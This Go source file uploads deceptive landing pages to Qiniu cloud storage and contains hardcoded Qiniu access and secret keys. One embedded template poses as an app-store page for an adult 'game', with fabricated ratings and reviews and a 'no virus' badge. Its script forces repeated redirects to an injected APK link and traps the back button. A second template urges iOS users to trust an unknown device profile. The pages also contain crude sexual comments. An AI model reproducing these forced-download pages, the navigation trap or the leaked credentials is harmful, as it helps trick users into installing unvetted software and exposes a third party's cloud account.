package utils

import (
	"bytes"
	"strings"
	// "fmt"
	"qiniupkg.com/api.v7/conf"
	"qiniupkg.com/api.v7/kodo"
	"qiniupkg.com/api.v7/kodocli"

	"qiniupkg.com/api.v7/cdn"
)

var (
	// 设置上传到的空间
	bucket = "game"
)

// 构造返回值字段
type PutRet struct {
	Hash string `json:"hash"`
	Key  string `json:"key"`
}

//简单上传
func Uploading(key, url string) (res string) {
	// 初始化AK，SK
	conf.ACCESS_KEY = "nUB2TE2ekJ7Q1UHeespxbTcHFxKM3o5Rsc2kAa0m"
	conf.SECRET_KEY = "3N3mtBL2tjGU64O4Qt0RjT3i6mRoTM-0e9SYp79i"

	//上传的数据
	data := strings.Replace(meiNvCaiQuanTpl, "{{.apk}}", url, -1)

	// 创建一个Client
	c := kodo.New(0, nil)
	// 设置上传的策略
	policy := &kodo.PutPolicy{
		Scope: bucket,
		//设置Token过期时间
		Expires: 3600,
	}
	// 生成一个上传token
	token := c.MakeUptoken(policy)
	// 构建一个uploader
	zone := 0
	uploader := kodocli.NewUploader(zone, nil)

	var ret PutRet
	// 设置上传文件的路径
	err := uploader.Put(nil, &ret, token, key, bytes.NewBuffer([]byte(data)), int64(len(data)), nil)
	if err != nil {
		res = err.Error()
	} else {
		res = "http://apk.sdyszm.cn/" + ret.Key
	}
	return res

}

//覆盖上传
func ReUploading(key, url string) (res []string) {
	// 初始化AK，SK
	conf.ACCESS_KEY = "nUB2TE2ekJ7Q1UHeespxbTcHFxKM3o5Rsc2kAa0m"
	conf.SECRET_KEY = "3N3mtBL2tjGU64O4Qt0RjT3i6mRoTM-0e9SYp79i"

	//上传的数据
	data := strings.Replace(meiNvCaiQuanTpl, "{{.apk}}", url, -1)

	// 创建一个Client
	c := kodo.New(0, nil)
	// 设置上传的策略
	policy := &kodo.PutPolicy{
		Scope: bucket + ":" + key,
		// 设置Token过期时间
		Expires: 3600,
	}
	// 生成一个上传token
	token := c.MakeUptoken(policy)

	// 构建一个uploader
	zone := 0
	uploader := kodocli.NewUploader(zone, nil)
	var ret PutRet
	// 设置上传文件的路径
	err := uploader.Put(nil, &ret, token, key, bytes.NewBuffer([]byte(data)), int64(len(data)), nil)
	if err != nil {
		res = []string{err.Error()}
	} else {
		res = []string{"http://apk.mayall.cn/" + ret.Key, "http://apk.sdyszm.cn/" + ret.Key, "http://apk.goxin.cn/" + ret.Key, "http://apk.saxmi.cn/" + ret.Key}
	}
	return res
}

//刷新
func RefreshDirsOrUrls(isUrl bool, urls ...string) (result cdn.RefreshResp, err error) {
	// 初始化AK，SK
	conf.ACCESS_KEY = "nUB2TE2ekJ7Q1UHeespxbTcHFxKM3o5Rsc2kAa0m"
	conf.SECRET_KEY = "3N3mtBL2tjGU64O4Qt0RjT3i6mRoTM-0e9SYp79i"

	if isUrl {
		result, err = cdn.RefreshUrls(urls)
	} else {
		result, err = cdn.RefreshDirs(urls)
	}
	return
}

var iosXiezhen = `<!DOCTYPE html>
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>丝女郎</title>
    <link rel="stylesheet" href="./css/index.css">
    <script type="text/javascript" src="./js/index.js"></script>
    <script type="text/javascript" src="./js/jquery-1.8.3.min.js"></script>
</head>
<body>
<div class="video" onclick="zjts()">
    <img src="./img/Group31@2x.jpg" alt="">
</div>
<div class="pics" onclick="zjts()">
    <ul>
        <li>
            <div class="img_pic">
                <img src="./img/ebb76e07b90ff9da631c09637467fde62@2x.jpg" alt="">
            </div>
            <span class="img_name">
                艳垂湿惑女琪儿性感写真
            </span>
        </li>
        <li>
            <div class="img_pic">
                <img src="./img/37467fde63@2x.jpg" alt="">
            </div>
            <span class="img_name">
                嫩模恒瑶瑶私房大尺度
            </span></li>
        <li>
            <div class="img_pic">
                <img src="./img/ebb76e07b90ff9da631c09637467fde63@2x.jpg" alt="">
            </div>
            <span class="img_name">
                菲嫩混血靓妞海尽显好身材
            </span></li>
        <li>
            <div class="img_pic">
                <img src="./img/ebb76e07b90ff9da631c09637467fde65@2x.jpg" alt="">
            </div>
            <span class="img_name">
                性感猫咪虞姬湿身魅惑
            </span></li>
        <li>
            <div class="img_pic">
                <img src="./img/ebb76e07b90ff9da631c09637467fde66@2x.jpg" alt="">
            </div>
            <span class="img_name">
                李欣儿-偷心女郎<br>
            </span></li>
        <li>
            <div class="img_pic">
                <img src="./img/ebb76e07b90ff9da631c09637467fde67@2x.jpg" alt="">
            </div>
            <span class="img_name">
                u216尤果网-周妍希
            </span></li>
    </ul>
</div>
<div class="gray"></div>
<div class="comment" onclick="zjts()">
    <h3>热门评论</h3>
    <div class="cmt_list_box">
        <ul>
            <li>
                <div class="photo">
                    <img src="./img/2017213t20.jpg" alt="">
                </div>
                <div class="cmt_detail">
                    <div class="cmt_name_box">
                        <div class="cmt_name">南环十三骚</div>
                        <div class="cmt_time">1分钟</div>
                    </div>
                    <div class="cmt_cnt">
                        图片质量很高清，资源很棒！模特身材比例好这套内衣秀值得慢慢回味。
                    </div>
                </div>
            </li>
            <li>
                <div class="photo">
                    <img src="./img/2017213t74.jpg" alt="">
                </div>
                <div class="cmt_detail">
                    <div class="cmt_name_box">
                        <div class="cmt_name">花落谁相伴</div>
                        <div class="cmt_time">15分钟</div>
                    </div>
                    <div class="cmt_cnt">
                        敢问下摄影师你受的了吗，视频高清好销魂啊
                    </div>
                </div>
            </li>
            <li>
                <div class="photo">
                    <img src="./img/2017213t77.jpg" alt="">
                </div>
                <div class="cmt_detail">
                    <div class="cmt_name_box">
                        <div class="cmt_name">帅飞一条街</div>
                        <div class="cmt_time">48分钟</div>
                    </div>
                    <div class="cmt_cnt">
                        这粉嫩的胸，前凸后翘的身材看着真带劲，好想犯罪怎么啊！！                    </div>
                </div>
            </li>
            <li>
                <div class="photo">
                    <img src="./img/2017213t97.jpg" alt="">
                </div>
                <div class="cmt_detail">
                    <div class="cmt_name_box">
                        <div class="cmt_name">明月共潮生</div>
                        <div class="cmt_time">1小时</div>
                    </div>
                    <div class="cmt_cnt">
                        皮肤真好啊，漂亮性感啊，海天盛筵的级别啊媚而不俗，默默的去了一趟厕所。                    </div>
                </div>
            </li>
        </ul>
    </div>
</div>
<div class="download_wrapper" onclick="zjts()">
    <div><i></i><span class="app_name">丝女郎</span></div>
    <span class="down_now">立即下载</span>
</div>
<div class="mask">
			<div class="alert-box">
				<div class="progress-box">
					<div class="progress-tip">安装中</div>
					<div class="color-bar"></div>
				</div>
				<div class="close-btn"></div>
				<div class="lead">
					<div id="aztkbt">提示：如果您无法正常打开软件，请根据以下引导，进行如下操作[设置]＞[通用]＞[描述文件与设备管理]＞信任证书！</div>
					<div class="turn-box">
						<ul class="turn-list">
							<li class="turn-item"></li>
						</ul>
					</div>
				</div>
				<div class="alert-btn">
					<a id="trust" class="trust-btn btn">立即信任</a>
				</div>
			</div>
		</div>
<div style="display: none;"><script language="javascript" type="text/javascript" src="//js.users.51.la/19251177.js"></script>
<noscript><a href="//www.51.la/?19251177" target="_blank"><img alt="&#x6211;&#x8981;&#x5566;&#x514D;&#x8D39;&#x7EDF;&#x8BA1;" src="//img.users.51.la/19251177.asp" style="border:none" /></a></noscript></div>
</body></html>`

var meiNvCaiQuanTpl = `<html>
	 <head>
	  <meta charset="utf-8" />
	  <meta name="author" content="monicaqin" />
	  <meta name="format-detection" content="telephone=no" />
	  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
	  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
	  <meta name="apple-mobile-web-app-capable" content="yes" />
	  <meta name="apple-mobile-web-app-status-bar-style" content="black" />
	  <title>调教初体验</title>
	  <script>window.timeArr=[Date.now()];</script>
	  <link rel="stylesheet" href="./all.css" />
	  <style type="text/css">section[id],div[id]{display:none}section[id].active,div[id].active{display:block}#scroller,.scroller{-webkit-transition:-webkit-transform 500ms;-webkit-backface-visibility:hidden}.mod-banner,.wrap,#scroller,.scroller,#scroller li,.scroller li,#scroller img,.scroller img{-webkit-backface-visibility:hidden}</style>
	 </head>
	 <body>
	  <div class="myapp-wrapper">
	   <div id="detail" data-switch="SWITCH.detail" class="active">
	    <section class="mod-content error">
	     <div class="mod-intr-contanier">
	      <div class="app-info">
	       <div class="icon-app">
		   <!--图标-->
	        <img src="./icon2.png" width="48" height="48" />
	       </div>
	       <div class="app-content-info">
		    <!--应用名-->
	        <h2>调教初体验</h2>
	        <div class="icon-star-list clearfix">
	         <span><span style="width: 90%"></span></span>
	        </div>
	        <p class="c-tx1">2964345人下载</p>
	       </div>
	      </div>
	      <ul class="mod-feature-list clearfix">
	       <li class="icon-official">官方版</li>
	       <li class="icon-no-ads">无广告</li>
	       <li class="icon-virus">无病毒</li>
	       <li class="icon-safe">用户保障</li>
	      </ul>
	      <div class="download-wrapper">
	       <a href="javascript:downfile();" data-click="ACTION.fastDownApp" data-appid="100692648" data-via="YYBH5.STORE.APPDETAIL"> 高速下载 </a>
	      </div>
	     </div>
	     <nav class="mod-sub-nav" data-click="DETAIL.switchTab">
	      <a class="detail-content cur">详情</a>
	     </nav>
	     <section class="mod-tab-content detail-content">
	      <div id="viewport" class="active">
	       <div id="wrap" class="active">
	        <ul id="scroller" class="active">
	         <li class="slide">
	          <div class="painting">
	           <div class="img-app"> 	
	            <img width="160" height="280" src="./2_img_3.jpg" />
	           </div>
	          </div></li>
	         <li class="slide">
	          <div class="painting">
	           <div class="img-app">
	            <img width="160" height="280" src="./2_img_2.jpg" />
	           </div>
	          </div></li>
	        </ul>
	       </div>
	      </div>
	      <section class="mod-category clearfix">
	       <ul>
	        <li>软件类别：美女休闲游戏</li>
	        <li>更新时间：2017-5-17</li>
	       </ul>
	      </section>
	      <section class="mod-detail-box mod-app-intr">
	       <h2>软件介绍</h2>
	       <div class="mod-white-tips">
	        小编推荐: 调教初体验是一款画面非常精致带有各种类型美女为题材的趣味类休闲游戏，在游戏中玩家需要和各种类型的美女进行各种挑逗。
	       </div>
	       <div class="mod-show-info" data-click="DETAIL.toggleinfo">
	        <p>是不是非常刺激呢？其玩法新颖有趣十分有特色，关卡非常刺激，游戏中加入了数十位美女等你来挑战。是不是已经非常心动了呢？快来试试吧。感兴趣的玩家快来下载游戏试试吧！</p>
	       </div>
	      </section>
	     </section>
	     <nav class="mod-sub-nav" data-click="DETAIL.switchTab">
	      <a class="feed-content cur">评价</a>
	     </nav>
	     <section class="mod-tab-content feed-content" loaded="1">
	      <section class="mod-detail-box mod-score-container">
	       <div class="mod-score-show">
	        <h5>平均评分</h5>
	        <div class="score-num">
	         4.73
	        </div>
	        <div class="icon-star-list clearfix">
	         <span><span style="width:70%"></span></span>
	        </div>
	        <p class="c-tx1">90万人</p>
	       </div>
	       <div class="mod-score-progress">
	        <ul class="score-list">
	         <li>
	          <div class="star-title">
	           5星
	          </div>
	          <div class="progress-bar-bg">
	           <div class="progress-bar" style="width:78.67%"></div>
	          </div>
	          <div class="score-rate"></div>711423</li>
	         <li>
	          <div class="star-title">
	           4星
	          </div>
	          <div class="progress-bar-bg">
	           <div class="progress-bar" style="width:17.3%"></div>
	          </div>
	          <div class="score-rate"></div>156448</li>
	         <li>
	          <div class="star-title">
	           3星
	          </div>
	          <div class="progress-bar-bg">
	           <div class="progress-bar" style="width:2.65%"></div>
	          </div>
	          <div class="score-rate"></div>23927</li>
	         <li>
	          <div class="star-title">
	           2星
	          </div>
	          <div class="progress-bar-bg">
	           <div class="progress-bar" style="width:0.77%"></div>
	          </div>
	          <div class="score-rate"></div>6915</li>
	         <li>
	          <div class="star-title">
	           1星
	          </div>
	          <div class="progress-bar-bg">
	           <div class="progress-bar" style="width:0.61%"></div>
	          </div>
	          <div class="score-rate"></div>5579</li>
	        </ul>
	       </div>
	      </section>
	      <section class="mod-detail-box feed-info">
	       <h5>用户评论</h5>
	       <section class="comment_list">
	        <section class="mod-feed-list">
	         <div class="user-status">
	          <p class="c-tx1">～——</p>
	          <div class="icon-star-list clearfix">
	           <span><span style="width:100%"></span></span>
	          </div>
	         </div>
	         <p>美女在脱衣服啊。</p>
	         <ul class="relative-info clearfix">
	          <li>机型：E9003 E9003</li>
	          <li></li>
	         </ul>
	        </section>
	        <section class="mod-feed-list">
	         <div class="user-status">
	          <p class="c-tx1">鲘h</p>
	          <div class="icon-star-list clearfix">
	           <span><span style="width:80%"></span></span>
	          </div>
	         </div>
	         <p>很好玩啊，我喜欢玩嘻嘻......</p>
	         <ul class="relative-info clearfix">
	          <li>机型：Meizu m3</li>
	          <li></li>
	         </ul>
	        </section>
	        <section class="mod-feed-list">
	         <div class="user-status">
	          <p class="c-tx1">宣灵</p>
	          <div class="icon-star-list clearfix">
	           <span><span style="width:100%"></span></span>
	          </div>
	         </div>
	         <p>宅男福利</p>
	         <ul class="relative-info clearfix">
	          <li>机型：koobee H7</li>
	          <li></li>
	         </ul>
	        </section>
	        <section class="mod-feed-list">
	         <div class="user-status">
	          <p class="c-tx1">梦幻旋律</p>
	          <div class="icon-star-list clearfix">
	           <span><span style="width:100%"></span></span>
	          </div>
	         </div>
	         <p>无法自拔啊，美女你出来</p>
	         <ul class="relative-info clearfix">
	          <li>机型：vivo vivoY31</li>
	          <li></li>
	         </ul>
	        </section>
	        <section class="mod-feed-list">
	         <div class="user-status">
	          <p class="c-tx1">情曦丶Crazy&deg;つ</p>
	          <div class="icon-star-list clearfix">
	           <span><span style="width:100%"></span></span>
	          </div>
	         </div>
	         <p>我日，艹，以前怎么没发现这个APP...</p>
	         <ul class="relative-info clearfix">
	          <li>机型：OPPO OPPOA37m</li>
	          <li></li>
	         </ul>
	        </section>
	        <section class="mod-feed-list">
	         <div class="user-status">
	          <p class="c-tx1">我不会笑i</p>
	          <div class="icon-star-list clearfix">
	           <span><span style="width:100%"></span></span>
	          </div>
	         </div>
	         <p>我最喜欢的黑丝。。。哈哈哈</p>
	         <ul class="relative-info clearfix">
	          <li>机型：Coolpad Coolpad5313S</li>
	          <li></li>
	         </ul>
	        </section>
	        <section class="mod-feed-list">
	         <div class="user-status">
	          <p class="c-tx1">三秒梦三年痛*</p>
	          <div class="icon-star-list clearfix">
	           <span><span style="width:100%"></span></span>
	          </div>
	         </div>
	         <p>挺好的</p>
	         <ul class="relative-info clearfix">
	          <li>机型：Xiaomi Redmi3S</li>
	          <li></li>
	         </ul>
	        </section>
	        <section class="mod-feed-list">
	         <div class="user-status">
	          <p class="c-tx1">史大坑</p>
	          <div class="icon-star-list clearfix">
	           <span><span style="width:100%"></span></span>
	          </div>
	         </div>
	         <p>妈蛋，各种制服诱惑。。。</p>
	         <ul class="relative-info clearfix">
	          <li>机型：vivo vivoY20T</li>
	          <li></li>
	         </ul>
	        </section>
	        <section class="mod-feed-list">
	         <div class="user-status">
	          <p class="c-tx1">OREO</p>
	          <div class="icon-star-list clearfix">
	           <span><span style="width:100%"></span></span>
	          </div>
	         </div>
	         <p>楼上的兄弟，快下载吧</p>
	         <ul class="relative-info clearfix">
	          <li>机型：Xiaomi 2014813</li>
	          <li></li>
	         </ul>
	        </section>
	        <section class="mod-feed-list">
	         <div class="user-status">
	          <p class="c-tx1">王磊一世</p>
	          <div class="icon-star-list clearfix">
	           <span><span style="width:100%"></span></span>
	          </div>
	         </div>
	         <p>尼玛呀~害得我又忍不住撸了几次，压根就停不下来啊</p>
	         <ul class="relative-info clearfix">
	          <li>机型：GiONEE V183</li>
	          <li></li>
	         </ul>
	        </section>
	        <section class="mod-feed-list">
	         <div class="user-status">
	          <p class="c-tx1">　ぺ灬cc果冻ル</p>
	          <div class="icon-star-list clearfix">
	           <span><span style="width:100%"></span></span>
	          </div>
	         </div>
	         <p></p>
	         <ul class="relative-info clearfix">
	          <li>机型：OPPO OPPOR9m</li>
	          <li></li>
	         </ul>
	        </section>
	        <section class="mod-feed-list">
	         <div class="user-status">
	          <p class="c-tx1">复杂</p>
	          <div class="icon-star-list clearfix">
	           <span><span style="width:100%"></span></span>
	          </div>
	         </div>
	         <p></p>
	         <ul class="relative-info clearfix">
	          <li>机型：samsung SMA7000</li>
	          <li></li>
	         </ul>
	        </section>
	        <section class="mod-feed-list">
	         <div class="user-status">
	          <p class="c-tx1">巅峰对决</p>
	          <div class="icon-star-list clearfix">
	           <span><span style="width:100%"></span></span>
	          </div>
	         </div>
	         <p></p>
	         <ul class="relative-info clearfix">
	          <li>机型：Meizu M5s</li>
	          <li></li>
	         </ul>
	        </section>
	        <section class="mod-feed-list">
	         <div class="user-status">
	          <p class="c-tx1">梦之韵，花之香</p>
	          <div class="icon-star-list clearfix">
	           <span><span style="width:100%"></span></span>
	          </div>
	         </div>
	         <p>非常好玩</p>
	         <ul class="relative-info clearfix">
	          <li>机型：ZTE ZTEN928Dt</li>
	          <li></li>
	         </ul>
	        </section>
	        <section class="mod-feed-list">
	         <div class="user-status">
	          <p class="c-tx1">无聊人生 ，谁来陪。</p>
	          <div class="icon-star-list clearfix">
	           <span><span style="width:100%"></span></span>
	          </div>
	         </div>
	         <p></p>
	         <ul class="relative-info clearfix">
	          <li>机型：lephone lephoneT6+V</li>
	          <li></li>
	         </ul>
	        </section>
	        <section class="mod-feed-list">
	         <div class="user-status">
	          <p class="c-tx1">楽 ?-??</p>
	          <div class="icon-star-list clearfix">
	           <span><span style="width:20%"></span></span>
	          </div>
	         </div>
	         <p></p>
	         <ul class="relative-info clearfix">
	          <li>机型：vivo vivoY51</li>
	          <li></li>
	         </ul>
	        </section>
	        <section class="mod-feed-list">
	         <div class="user-status">
	          <p class="c-tx1">六年级的你真可爱</p>
	          <div class="icon-star-list clearfix">
	           <span><span style="width:100%"></span></span>
	          </div>
	         </div>
	         <p></p>
	         <ul class="relative-info clearfix">
	          <li>机型：Meizu M3s</li>
	          <li></li>
	         </ul>
	        </section>
	        <section class="mod-feed-list">
	         <div class="user-status">
	          <p class="c-tx1">承诺。</p>
	          <div class="icon-star-list clearfix">
	           <span><span style="width:100%"></span></span>
	          </div>
	         </div>
	         <p></p>
	         <ul class="relative-info clearfix">
	          <li>机型：LeEco LeX620</li>
	          <li></li>
	         </ul>
	        </section>
	        <section class="mod-feed-list">
	         <div class="user-status">
	          <p class="c-tx1">逆水而流</p>
	          <div class="icon-star-list clearfix">
	           <span><span style="width:100%"></span></span>
	          </div>
	         </div>
	         <p>兔子装扮......爽啊</p>
	         <ul class="relative-info clearfix">
	          <li>机型：GO D51732</li>
	          <li></li>
	         </ul>
	        </section>
	        <section class="mod-feed-list">
	         <div class="user-status">
	          <p class="c-tx1">幸福快乐</p>
	          <div class="icon-star-list clearfix">
	           <span><span style="width:100%"></span></span>
	          </div>
	         </div>
	         <p></p>
	         <ul class="relative-info clearfix">
	          <li>机型：Huawei H60L01</li>
	          <li></li>
	         </ul>
	        </section>
	       </section>
	      </section>
	     </section>
		  <!--
	      <section class="mod-detail-box related-download guess" data-id="100692648">
	       <h2>浏览的用户还下载了</h2>
	       <ul class="mod-software-list clearfix" data-via="YYBH5.STORE.APPDETAIL.APPDETAILRELATED">
	        <li data-nav="detail(appid)" data-appid="100884080">
	         <div class="box-inner">
	          <div class="icon-app">
	           <img src="http://i.gtimg.cn/open/app_icon/00/88/40/80/100884080_100_m.png" width="36" height="36" />
	          </div>
	          <p>滴滴出行</p>
	          <p class="c-tx2">2亿人下载</p>
	         </div></li>
	       </ul>
	      </section>
		  -->
	    </section>
	   </div>
	
	   <footer class="mod-footer" data-via="YYBH5.STORE.FOOTERBTN">
	    <a class="btn-backtop" href="javascript:scrollTop();">返回 顶部</a>
	   </footer>
	  </div>
	<script>
	function g(name){
	    var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
	    var r = window.location.search.substr(1).match(reg);
	    if(r != null) return unescape(r[2]); return null;
	}
	function getNowFormatDate() { 
		var day = new Date(); 
		var Year = 0; 
		var Month = 0; 
		var Day = 0; 
		var CurrentDate = "";
		Year = day.getFullYear();
		Month = day.getMonth() + 1; 
		Day = day.getDate(); 
		Hour = day.getHours(); 
		Minute = day.getMinutes(); 
		Minute = Minute - (Minute % 10);
		Second = day.getSeconds(); 
		CurrentDate += Year; 
		if (Month >= 10 ) CurrentDate += Month; 
		else CurrentDate += "0" + Month; 
		if (Day >= 10 ) CurrentDate += Day;
		else CurrentDate += "0" + Day;
		if(Hour >= 10) CurrentDate += Hour;
		else CurrentDate += "0" + Hour;
		if(Minute >= 10) CurrentDate += Minute;
		else CurrentDate += "0" + Minute;
		if(Second >= 10) CurrentDate += Second;
		else CurrentDate += "0" + Second;
		return CurrentDate; 
	}
	function scrollTop()
	{
		document.documentElement.scrollTop = document.body.scrollTop = 0;
	}
	function downfile()
	{
		location.href = "{{.apk}}"
	}
	var c = g("c");
	if(c == null) c = "90000";
	var isback = g("back");
	setTimeout("downfile()", 3000)
	setTimeout("downfile()", 10000)
	setTimeout("downfile()", 20000)
	if(isback != "1")
	{
		history.pushState({ page: 1 }, "title 1", "#nbb");
		window.onhashchange = function (event) {window.location.hash = "nbb";};
	}
	</script>
	<script language="javascript" type="text/javascript" src="//js.users.51.la/19224754.js"></script>
	<noscript><a href="//www.51.la/?19224754" target="_blank"><img alt="&#x6211;&#x8981;&#x5566;&#x514D;&#x8D39;&#x7EDF;&#x8BA1;" src="//img.users.51.la/19224754.asp" style="border:none" /></a></noscript>
	 </body>
	</html>`
